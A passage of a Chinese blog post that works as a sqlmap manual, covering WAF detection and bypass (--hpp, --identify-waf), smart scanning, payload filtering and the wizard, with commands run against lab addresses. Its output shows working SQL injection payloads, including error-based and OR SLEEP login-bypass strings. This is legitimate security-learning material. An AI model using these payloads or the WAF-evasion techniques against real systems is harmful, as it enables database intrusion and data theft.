<span class="hljs-string">'Informix'</span>. Download from https://github.com/ibmdb/python-ibmdb</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-pyodbc'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Microsoft Access'</span>. Download from https://github.com/mkleehammer/pyodbc</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-pymssql'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Microsoft SQL Server'</span>. Download from https://github.com/pymssql/pymssql</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-impacket'</span> third-party library <span class="hljs-keyword">for</span> out-of-band takeover feature. Download from http://code.google.com/p/impacket/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-ntlm'</span> third-party library <span class="hljs-keyword">if</span> you plan to attack a web application behind NTLM authentication. Download from http://code.google.com/p/python-ntlm/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'websocket-client'</span> third-party library <span class="hljs-keyword">if</span> you plan to attack a web application using WebSocket. Download from https://pypi.python.org/pypi/websocket-client/</span><br><span class="line">     </span><br><span class="line">[*] shutting down at 19:16:05</span><br></pre></td></tr></table></figure>
+<p>可以看到我缺少的主要是用于连接数据库的第三方库。<br><strong><em>7.关闭彩色输出</em></strong><br><strong>参数：–disable-coloring</strong><br><strong><em>8.指定使用Google dork结果的某页</em></strong><br><strong>参数：–gpage</strong><br>使用参数“-g”时默认默认选择Google dork结果的前100条做注入测试。结合使用此参数，可以指定使用Google dork结果的某页。<br><strong><em>9.使用HTTP参数污染</em></strong><br><strong>参数：–hpp</strong><br>HTTP参数污染是绕过WAF/IPS/IDS的一种技术，详情见此处。这一技术针对ASP/IIS和ASP.NET/IIS平台尤其有效。如果怀疑目标受WAF/IPS/IDS保护，可以尝试用此参数进行绕过。<br><strong><em>10.彻底检测WAF/IPS/IDS</em></strong><br><strong>参数：–identify-waf</strong><br>Sqlmap可以识别WAF/IPS/IDS以便用户进行针对性操作（如：添加“–tamper”）。目前Sqlmap支持检测30多种不同的WAF/IPS/IDS，如Airlock和Barracuda WAF等。检测WAF的脚本可以在安装目录的waf目录中找到。<br>下例的目标是MySQL，受ModSecurity WAF保护：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1"</span> --identify-waf -v 3</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:23] [INFO] testing connection to the target URL</span><br><span class="line">[xx:xx:23] [INFO] heuristics detected web page charset <span class="hljs-string">'ascii'</span></span><br><span class="line">[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection</span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'USP Secure Entry Server (United Security Providers)'</span>[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'BinarySEC Web Application Firewall (BinarySEC)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Hyperguard Web Application Firewall (art of defence Inc.)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Cisco ACE XML Gateway (Cisco Systems)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'TrafficShield (F5 Networks)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'KONA Security Solutions (Akamai Technologies)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Incapsula Web Application Firewall (Incapsula/Imperva)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'CloudFlare Web Application Firewall (CloudFlare)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Barracuda Web Application Firewall (Barracuda Networks)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'webApp.secure (webScurity)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Proventia Web Application Security (IBM)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] declared web page charset <span class="hljs-string">'iso-8859-1'</span></span><br><span class="line">[xx:xx:23] [DEBUG] page not found (404)</span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'KS-WAF (Knownsec)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'NetScaler (Citrix Systems)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Jiasule Web Application Firewall (Jiasule)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'WebKnight Application Firewall (AQTRONIX)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'AppWall (Radware)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'ModSecurity: Open Source Web Application Firewall (Trustwave)'</span></span><br><span class="line">[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified <span class="hljs-string">'ModSecurity: Open Source Web Application Firewall (Trustwave)'</span>. Please consider usage of tamper scripts (option <span class="hljs-string">'--tamper'</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>参数：–skip-waf</strong><br>默认地Sqlmap会发送虚假的SQL注入playload以试探目标是否有保护措施。如有任何问题，用户可以使用参数“–skip-waf”来禁用这一技术。<br><strong><em>11.模仿智能手机</em></strong><br><strong>参数：–mobile</strong><br>有些网站对智能手机和桌面环境的返回是不同的。当需要测试这种网站的智能手机页面时可以设置一个智能手机的User-Agent，或者更简单地，使用此参数，Sqlmap会在执行时询问要模仿成流行的手机中的哪种，如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="hljs-string">"http://www.target.com/vuln.php?id=1"</span> --mobile</span><br><span class="line">[...]</span><br><span class="line"><span class="hljs-built_in">which</span> smartphone <span class="hljs-keyword">do</span> you want sqlmap to imitate through HTTP User-Agent header?</span><br><span class="line">[1] Apple iPhone 4s (default)</span><br><span class="line">[2] BlackBerry 9900</span><br><span class="line">[3] Google Nexus 7</span><br><span class="line">[4] HP iPAQ 6365</span><br><span class="line">[5] HTC Sensation</span><br><span class="line">[6] Nokia N97</span><br><span class="line">[7] Samsung Galaxy S</span><br><span class="line">&gt; 1</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+<p><strong><em>12.离线模式（仅仅使用会话数据）</em></strong><br><strong>参数：–offline</strong><br>添加此参数，Sqlmap将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包。<br><strong><em>13.在Google dork中展示页面权重</em></strong><br><strong>参数：–page-rank</strong><br>与参数“-g”一起使用，这会使Sqlmap向Google发起更多的请求并展示页面权重。<br><strong><em>14.从输出目录中安全移除所有内容</em></strong><br><strong>参数：–purge-output</strong><br>当用户想要安全地删除输出目录中的所有内容时使用此参数。所谓安全删除，不仅仅是删除，而是在删除前先用随机数据覆盖原有数据，甚至对文件名和目录名也进行重命名以覆盖旧名称，所有覆盖工作完成后才执行删除。最后，输出目录中会一无所有。如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --purge-output -v 3</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] starting at 19:51:36</span><br><span class="line">     </span><br><span class="line">[19:51:36] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[19:51:36] [INFO] purging content of directory <span class="hljs-string">'/home/werner/.sqlmap/output'</span>...</span><br><span class="line">[19:51:36] [DEBUG] changing file attributes</span><br><span class="line">[19:51:36] [DEBUG] writing random data to files</span><br><span class="line">[19:51:36] [DEBUG] truncating files</span><br><span class="line">[19:51:36] [DEBUG] renaming filenames to random values</span><br><span class="line">[19:51:36] [DEBUG] renaming directory names to random values</span><br><span class="line">[19:51:36] [DEBUG] deleting the whole directory tree</span><br><span class="line">     </span><br><span class="line">[*] shutting down at 19:51:36</span><br></pre></td></tr></table></figure>
+<p><strong><em>15.快速扫描</em></strong><br><strong>参数：–smart</strong><br>当有大量URL要进行测试（如：“-m”），目的是尽快找出其中存在的某些注入点而有所遗漏也没有关系时可以使用“–smart”进行正向启发式扫描。此时只有让数据库管理系统报错的参数才会做进一步测试，其余URL均被跳过。如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="hljs-string">"http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1"</span> --batch --smart</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-string">'ca'</span> is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] GET parameter <span class="hljs-string">'ca'</span> does not appear dynamic</span><br><span class="line">[xx:xx:14] [WARNING] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">'ca'</span> might not be injectable</span><br><span class="line">[xx:xx:14] [INFO] skipping GET parameter <span class="hljs-string">'ca'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-string">'user'</span> is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] GET parameter <span class="hljs-string">'user'</span> does not appear dynamic</span><br><span class="line">[xx:xx:14] [WARNING] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">'user'</span> might not be injectable</span><br><span class="line">[xx:xx:14] [INFO] skipping GET parameter <span class="hljs-string">'user'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-string">'id'</span> is dynamic</span><br><span class="line">[xx:xx:14] [INFO] confirming that GET parameter <span class="hljs-string">'id'</span> is dynamic</span><br><span class="line">[xx:xx:14] [INFO] GET parameter <span class="hljs-string">'id'</span> is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[xx:xx:14] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">'id'</span> might be</span><br><span class="line">injectable (possible DBMS: <span class="hljs-string">'MySQL'</span>)</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter <span class="hljs-string">'id'</span> heuristic (parsing) <span class="hljs-built_in">test</span> showed that the back-end DBMS could be <span class="hljs-string">'MySQL'</span>. Do you want to skip <span class="hljs-built_in">test</span> payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] Y</span><br><span class="line"><span class="hljs-keyword">do</span> you want to include all tests <span class="hljs-keyword">for</span> <span class="hljs-string">'MySQL'</span> extending provided level (1) and risk (1)? [Y/n] Y</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'AND boolean-based blind - WHERE or HAVING clause'</span></span><br><span class="line">[xx:xx:14] [INFO] GET parameter <span class="hljs-string">'id'</span> is <span class="hljs-string">'AND boolean-based blind - WHERE or HAVING clause'</span> injectable</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'</span></span><br><span class="line">[xx:xx:14] [INFO] GET parameter <span class="hljs-string">'id'</span> is <span class="hljs-string">'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'</span> injectable</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL inline queries'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL &gt; 5.0.11 stacked queries'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL &lt; 5.0.12 stacked queries (heavy query)'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL &gt; 5.0.11 AND time-based blind'</span></span><br><span class="line">[xx:xx:24] [INFO] GET parameter <span class="hljs-string">'id'</span> is <span class="hljs-string">'MySQL &gt; 5.0.11 AND time-based blind'</span> injectable</span><br><span class="line">[xx:xx:24] [INFO] testing <span class="hljs-string">'MySQL UNION query (NULL) - 1 to 20 columns'</span></span><br><span class="line">[xx:xx:24] [INFO] automatically extending ranges <span class="hljs-keyword">for</span> UNION query injection technique tests as there is at least one other potential injection technique found</span><br><span class="line">[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the</span><br><span class="line">time needed to find the right number of query columns. Automatically extending the range <span class="hljs-keyword">for</span> current UNION query injection technique <span class="hljs-built_in">test</span></span><br><span class="line">[xx:xx:24] [INFO] target URL appears to have 3 columns <span class="hljs-keyword">in</span> query</span><br><span class="line">[xx:xx:24] [INFO] GET parameter <span class="hljs-string">'id'</span> is <span class="hljs-string">'MySQL UNION query (NULL) - 1 to 20 columns'</span> injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+<p><strong><em>16.通过关键词使用或跳过payload</em></strong><br><strong>参数：–test-filter</strong><br>若只想使用包含关键词“ROW”的payload可使用参数“–test-filter=ROW”。下面是以Mysql为目标的例子：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1"</span> --batch --<span class="hljs-built_in">test</span>-filter=ROW</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:39] [INFO] GET parameter ’id’ is dynamic</span><br><span class="line">[xx:xx:39] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[xx:xx:39] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter ’id’ might be injectable (possible DBMS: ’MySQL’)</span><br><span class="line">[xx:xx:39] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter ’id’</span><br><span class="line">[xx:xx:39] [INFO] testing ’MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause’</span><br><span class="line">[xx:xx:39] [INFO] GET parameter ’id’ is ’MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause’ injectable GET parameter ’id’ is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection points with a total of 3 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Place: GET</span><br><span class="line">Parameter: id</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1 AND ROW(4959,4971)&gt;(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELECT (CASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FROM (SELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+<p><strong>参数：–test-skip</strong><br>若不想使用包含关键词“BENCHMARK”的payload可使用参数“–test-skip=BENCHMARK”。<br><strong><em>17.交互式Sqlmap Shell</em></strong><br><strong>参数：–sqlmap-shell</strong><br>使用此参数可以打开一个交互式的Sqlmap Shell，支持历史记录。如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ sqlmap --sqlmap-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.1.10<span class="hljs-comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="hljs-string">"]     | .'| . |</span></span><br><span class="line"><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|</span></span><br><span class="line"><span class="hljs-string">      |_|V          |_|   http://sqlmap.org</span></span><br><span class="line"><span class="hljs-string">sqlmap-shell&gt; -u "</span>192.168.56.102<span class="hljs-string">"</span></span><br><span class="line"><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="hljs-string">[*] starting at 20:22:46</span></span><br><span class="line"><span class="hljs-string">[20:22:46] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="hljs-string">[20:22:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span></span><br><span class="line"><span class="hljs-string">[20:22:46] [INFO] testing if the target URL is stable</span></span><br><span class="line"><span class="hljs-string">[20:22:47] [INFO] target URL is stable</span></span><br><span class="line"><span class="hljs-string">[20:22:47] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')</span></span><br><span class="line"><span class="hljs-string">[*] shutting down at 20:22:47</span></span><br><span class="line"><span class="hljs-string">        ___</span></span><br><span class="line"><span class="hljs-string">       __H__</span></span><br><span class="line"><span class="hljs-string"> ___ ___[.]_____ ___ ___  &#123;1.1.10#stable&#125;</span></span><br><span class="line"><span class="hljs-string">|_ -| . ["</span>]     | .<span class="hljs-string">'| . |</span></span><br><span class="line"><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|</span></span><br><span class="line"><span class="hljs-string">      |_|V          |_|   http://sqlmap.org</span></span><br><span class="line"><span class="hljs-string">sqlmap-shell&gt; exit</span></span><br></pre></td></tr></table></figure>
+<p><strong><em>18.为初学者准备的简单向导</em></strong><br><strong>参数：–wizard</strong><br>Sqlmap特地为初学者准备了一个有着尽可能少问题的工作流的向导。用户输入目标后若一直按回车选择默认回答到工作流的最后也会得到一个正确的结果。如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ sqlmap --wizard</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="hljs-string">"]_____ ___ ___  &#123;1.1.10#stable&#125;</span></span><br><span class="line"><span class="hljs-string">|_ -| . [)]     | .'| . |</span></span><br><span class="line"><span class="hljs-string">|___|_  ["</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="hljs-keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="hljs-string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="hljs-string">[*] starting at 20:39:41</span></span><br><span class="line"><span class="hljs-string">[20:39:41] [INFO] starting wizard interface</span></span><br><span class="line"><span class="hljs-string">Please enter full target URL (-u): http://192.168.56.102/login.php</span></span><br><span class="line"><span class="hljs-string">POST data (--data) [Enter for None]: username=001&amp;password=003</span></span><br><span class="line"><span class="hljs-string">Injection difficulty (--level/--risk). Please choose:</span></span><br><span class="line"><span class="hljs-string">[1] Normal (default)</span></span><br><span class="line"><span class="hljs-string">[2] Medium</span></span><br><span class="line"><span class="hljs-string">[3] Hard</span></span><br><span class="line"><span class="hljs-string">&gt; 1</span></span><br><span class="line"><span class="hljs-string">Enumeration (--banner/--current-user/etc). Please choose:</span></span><br><span class="line"><span class="hljs-string">[1] Basic (default)</span></span><br><span class="line"><span class="hljs-string">[2] Intermediate</span></span><br><span class="line"><span class="hljs-string">[3] All</span></span><br><span class="line"><span class="hljs-string">&gt; 1</span></span><br><span class="line"><span class="hljs-string">sqlmap is running, please wait..</span></span><br><span class="line"><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="hljs-string">---</span></span><br><span class="line"><span class="hljs-string">Parameter: username (POST)</span></span><br><span class="line"><span class="hljs-string">    Type: boolean-based blind</span></span><br><span class="line"><span class="hljs-string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</span></span><br><span class="line"><span class="hljs-string">    Payload: username=001%'</span> OR NOT 2143=2143<span class="hljs-comment">#&amp;password=003</span></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind (comment)</span><br><span class="line">    Payload: username=001%<span class="hljs-string">' OR SLEEP(5)#&amp;password=003</span></span><br><span class="line"><span class="hljs-string">---</span></span><br><span class="line"><span class="hljs-string">web server operating system: Linux Ubuntu</span></span><br><span class="line"><span class="hljs-string">web application technology: Apache 2.4.7, PHP 5.5.9</span></span><br><span class="line"><span class="hljs-string">back-end DBMS operating system: Linux Ubuntu</span></span><br><span class="line"><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="hljs-string">banner:    '</span>5.5.50-0ubuntu0.14.04.1<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">current user:    '</span>root@localhost<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">current database:    '</span>DSSchool<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">current user is DBA:    True</span></span><br><span class="line"><span class="hljs-string">[*] shutting down at 20:40:07</span></span><br></pre></td></tr></table></figure>
+<h3 id="ox14-总结"><a href="#ox14-总结" class="headerlink" title="ox14 总结"></a>ox14 总结</h3><p>完整阅读Sqlmap官方手册后终于对Sqlmap有了一个较为全面的认识。以前只是有所耳闻，现在切实地感受到了Sqlmap的强大，也愈加敬佩Sqlmap的两位作者：<br>    Bernardo Damele A. G. (@inquisb)<br>    Miroslav Stampar (@stamparm)</p>
+<p>以上就是参考大佬总结的sqlmap命令行介绍，感觉很全面所以可以当一个手册，下一步就是找时间读一读源码了。</p>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/" rel="tag">工具手册</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="/images/zfb.jpg" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="/images/wechat_pay.jpg" alt="微信"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/06/23/%E6%9C%89%E7%82%B9%E6%84%8F%E6%80%9D%E7%9A%84XSS/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">有点意思的XSS</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/04/01/%E5%9B%9B%E6%9C%88%E6%98%AF%E4%BD%A0%E7%9A%84%E8%B0%8E%E8%A8%80/">
+                <span class="level-item">四月是你的谎言</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    
+                        <img class="image is-128x128 has-mb-6" src="/images/header.jpg" alt="F4Guo">
+                    
+                    
+                    <p class="is-size-4 is-block">
+                        F4Guo
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        懒是原罪
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>银河系 地球</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        38
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
